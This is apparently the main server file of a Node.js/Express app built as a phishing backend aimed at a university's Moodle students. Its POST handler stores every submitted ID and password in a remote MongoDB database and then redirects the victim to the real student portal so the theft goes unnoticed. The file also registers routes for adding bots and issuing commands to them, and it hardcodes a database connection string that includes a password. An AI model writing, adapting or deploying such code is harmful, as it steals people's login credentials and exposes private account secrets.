const express = require('express');
const app = express();
var path = require('path');
const port = 3000;
const bodyParser = require('body-parser')
const mongoose = require('mongoose');
const User = require('./user');
const dbURI = 'mongodb+srv://kira:QEqcyn4hpCWHVIvR@cluster0.dakub.mongodb.net/?retryWrites=true&w=majority'


// routers 
var indexRouter = require('./routes/index');
var usersRouter = require('./routes/users');
var botsRouter = require('./routes/bots');
var botRouter = require('./routes/bot')
const addBotRouter = require('./routes/addBot')
const addCommand = require('./routes/addCommand')
const addResponse = require('./routes/addResponse')
const getCommand = require('./routes/getCommand')



// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

app.use(bodyParser.urlencoded({ extended: true }));



// routes
app.use('/', indexRouter);
app.use('/users', usersRouter);
app.use('/bots', botsRouter);
app.use('/bot', botRouter);
app.use('/addBot', addBotRouter);
app.use('/addCommand', addCommand);
app.use('/addResponse', addResponse);
app.use('/getCommand', getCommand);

// app.get('/', (req, res) => {
//     res.send('working')
// })
app.post('/', (req, res) => {

    mongoose.connect(dbURI)
        .then((result) => {

            let ID = req.body.ID
            let PASS = req.body.PASS
            if (ID == undefined) {
                ID = 'null'
            }
            if (PASS == undefined) {
                PASS = 'null'
            }
            const user = new User({
                ID: ID,
                PASS: PASS
            })
            user.save();
        });
    res.redirect("http://moodle.smuc.edu.et/students/")
})

app.listen(port, () => {
    console.log(`running on ${port}`)
})
module.exports = app;